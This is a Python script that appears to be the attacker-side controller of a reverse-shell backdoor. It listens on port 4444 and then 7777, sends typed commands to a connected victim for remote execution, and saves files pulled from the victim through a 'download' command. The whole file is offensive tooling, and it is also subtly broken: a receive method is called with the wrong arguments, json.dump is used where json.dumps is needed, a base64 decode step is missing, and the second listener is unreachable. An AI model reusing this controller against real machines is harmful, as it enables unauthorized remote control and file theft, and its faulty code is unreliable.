#!/usr/bin/env python

import socket
import json 
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print('[+] waiting for incominig connection')
        self.connection, adress = listener.accept()
        print('[+] get a connection from', adress)


    def reliable_receive(self, data):

        json_data = self.connection.recv(1024)
        json_data = ""

        while True:
           try:
               json_data = json_data + self.connection.recv(1024).decode()
               return json.loads(json_data)
           except json.decoder.JSONDecodeError:
               continue

    def reliable_send(self,data):
        json_data = json.dump(data).encode()
        self.connection.send(json_data)

    def execute_remotely(self, command):
     self.reliable_send(command)
     if command[0] == 'exit':
         self.connection.close()
         exit()
     return self.reliable_receive()
    

    def change_file(self, path, content):
        with open(path, 'wb') as f:
            #декодирую base64
            f.write(content.encode())
            return '[+] Download succesful.'

    def run(self):
        while True:
            command = input('>>>>')
            command = command.split()
            result = self.execute_remotely(command)
            if command[0] == 'download':
                self.change_file(command[1], result)
            print(result)

    
    



ip = ''
port = 4444
my_listener = Listener(ip, port)
my_listener.run()

ip = ''
port = 7777
my_listener2 = Listener(ip, port)
my_listener2.run()